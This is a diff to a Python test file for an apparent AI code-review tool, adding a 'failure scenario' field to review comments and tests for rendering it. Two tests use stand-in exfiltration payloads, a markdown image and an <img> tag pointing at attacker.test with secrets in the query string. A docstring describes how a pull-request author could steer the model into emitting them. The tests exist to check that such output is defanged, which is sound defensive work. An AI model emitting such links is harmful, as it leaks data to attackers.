@@ -41,10 +41,12 @@ def _comment(
     *, path: str = "app/main.py", start: int = 2, end: int = 2,
     severity: str = "warning", category: str = "logic_error",
     text: str = "This is wrong.", suggestion: str | None = None,
+    failure_scenario: str | None = None,
 ) -> ReviewComment:
     return ReviewComment(
         file_path=path, line_start=start, line_end=end,
         severity=severity, category=category, comment_text=text, suggestion=suggestion,
+        failure_scenario=failure_scenario,
     )
 
 
@@ -184,6 +186,54 @@ def test_comment_body_carries_severity_and_category() -> None:
     )
     assert "critical" in postable[0]["body"]
     assert "security" in postable[0]["body"]
+
+
+def test_comment_body_carries_the_failure_scenario() -> None:
+    """Its own paragraph, so the finding and its trigger stay separable."""
+    postable, _ = partition_comments(
+        [_comment(failure_scenario="With items empty, items[-1] raises IndexError.")],
+        parse_diff(TWO_HUNK_DIFF),
+    )
+    body = postable[0]["body"]
+    assert "With items empty, items[-1] raises IndexError." in body
+    # After the comment text, not folded into it.
+    assert body.index("This is wrong.") < body.index("With items empty")
+
+
+def test_comment_body_omits_the_scenario_when_absent() -> None:
+    """A row written before this milestone has none, and must not grow an
+    empty "Fails when:" label with nothing after it."""
+    postable, _ = partition_comments([_comment()], parse_diff(TWO_HUNK_DIFF))
+    assert "Fails when" not in postable[0]["body"]
+
+
+def test_a_failure_scenario_is_defanged() -> None:
+    """The one new path this milestone opens from model output to a GitHub body.
+
+    `failure_scenario` is model prose derived from a diff the pull request
+    author wrote, exactly like `comment_text` — so a markdown image in it
+    would fetch an attacker's URL the moment a maintainer loaded the comment,
+    exfiltrating whatever the model was induced to put in the query string.
+    Every other model-authored string on this path is defanged; missing this
+    one would have reopened a closed hole.
+    """
+    postable, _ = partition_comments(
+        [_comment(failure_scenario="Fails when ![](https://attacker.test/?d=SECRET)")],
+        parse_diff(TWO_HUNK_DIFF),
+    )
+
+    assert "![](" not in postable[0]["body"]
+    assert "attacker.test" in postable[0]["body"]  # neutralised, not dropped
+
+
+def test_a_failure_scenario_html_tag_is_defanged() -> None:
+    """The raw-HTML half of the same hole — GitHub renders a bare <img>."""
+    postable, _ = partition_comments(
+        [_comment(failure_scenario='Fails when <img src="https://attacker.test/?d=X">')],
+        parse_diff(TWO_HUNK_DIFF),
+    )
+
+    assert "<img" not in postable[0]["body"]
 
 
 def test_a_suggestion_becomes_a_github_suggestion_block() -> None:
